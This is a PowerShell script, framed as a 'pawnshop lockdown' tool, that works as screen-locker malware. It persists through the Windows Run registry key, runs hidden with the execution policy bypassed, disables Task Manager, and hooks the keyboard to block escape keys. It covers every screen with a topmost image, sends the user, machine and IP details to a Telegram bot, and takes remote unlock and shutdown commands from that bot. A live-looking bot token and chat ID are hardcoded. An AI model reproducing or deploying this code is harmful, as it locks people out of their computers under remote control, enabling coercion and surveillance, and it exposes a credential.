# Pawnshop Lockdown Script v2.0
# Fully functional lockdown with improved key blocking and Telegram control

# --- Configuration ---
$ImageUrl  = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$BotToken  = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$ChatID    = "656189986"

# Identify PC/User
$Username  = [Environment]::UserName
$Computer  = [Environment]::MachineName

# Lock state file path (user folder)
$LockFile = "$env:APPDATA\lock_status.txt"
if (-not (Test-Path $LockFile)) { "locked" | Out-File $LockFile -Force }

# --- Auto-start on boot if locked ---
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunValueName = "PawnShopLock"
if ($MyInvocation.MyCommand.Path) {
    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
}

# --- Disable Task Manager ---
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force

# --- Load Windows Forms ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# --- Block ALT+TAB, Win, and ALT+F4 ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyInterceptor {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hookId = IntPtr.Zero;
    private static HookProc proc = HookCallback;
    private delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void Start() {
        IntPtr hMod = GetModuleHandle(null);
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, hMod, 0);
    }
    public static void Stop() {
        UnhookWindowsHookEx(hookId);
    }
    private static IntPtr HookCallback(int code, IntPtr wParam, IntPtr lParam) {
        if (code >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            bool alt = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
            bool ctrl = (Control.ModifierKeys & Keys.Control) == Keys.Control;
            if (key == Keys.LWin || key == Keys.RWin || key == Keys.Tab || (alt && key == Keys.F4) || (alt && key == Keys.Tab) || (key == Keys.Escape && ctrl)) {
                return (IntPtr)1;
            }
        }
        return CallNextHookEx(hookId, code, wParam, lParam);
    }
}
"@
[KeyInterceptor]::Start()

# --- Display Fullscreen Image on All Screens ---
try {
    $web = New-Object Net.WebClient
    $imageData = $web.DownloadData($ImageUrl)
    $image = [Drawing.Image]::FromStream([IO.MemoryStream]::new($imageData))
} catch {
    $image = New-Object Drawing.Bitmap 1920, 1080
    [Drawing.Graphics]::FromImage($image).Clear([Drawing.Color]::Black)
}

$forms = @()
foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; TopMost = $true; Bounds = $screen.Bounds; ShowInTaskbar = $false; KeyPreview = $true; Cursor = [Windows.Forms.Cursors]::None
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{ Dock = 'Fill'; SizeMode = 'Zoom'; Image = $image }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $form.Add_Deactivate({ $_.Source.Activate() })
    $form.Controls.Add($pb)
    $form.Show()
    $forms += $form
}

# --- Telegram Notification ---
try { $ipPublic = Invoke-RestMethod 'https://api.ipify.org' } catch { $ipPublic = 'Unknown' }
$ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -notmatch '^127' } | Select -First 1 -ExpandProperty IPAddress)
$msg = "Pawnshop PC Locked:`nUser: $Username`nPC: $Computer`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nCommands:`n/unlock$Username`n/shutdown$Username`n/lock$Username" 
Invoke-RestMethod "https://api.telegram.org/bot$BotToken/sendMessage" -Method Post -Body (@{chat_id=$ChatID;text=$msg}|ConvertTo-Json) -ContentType 'application/json'

# --- Telegram Listener ---
$offset = 0; $script:AllowClose = $false
$timer = New-Object Windows.Forms.Timer -Property @{ Interval = 3000 }
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$BotToken/getUpdates?offset=$offset"
        foreach ($update in $updates.result) {
            $offset = $update.update_id + 1
            $cmd = $update.message.text.ToLower().Trim()
            switch ($cmd) {
                "/unlock$($Username.ToLower())" {
                    "unlocked" | Out-File $LockFile -Force
                    Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
                    $script:AllowClose = $true; [Windows.Forms.Application]::Exit()
                }
                "/shutdown$($Username.ToLower())" {
                    Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                    Stop-Computer -Force
                }
                "/lock$($Username.ToLower())" {
                    "locked" | Out-File $LockFile -Force
                    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Force
                }
            }
        }
    } catch {}
})
$timer.Start()

# --- Run App Loop ---
[Windows.Forms.Application]::Run()

# --- Cleanup ---
$timer.Stop()
[KeyInterceptor]::Stop()
Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
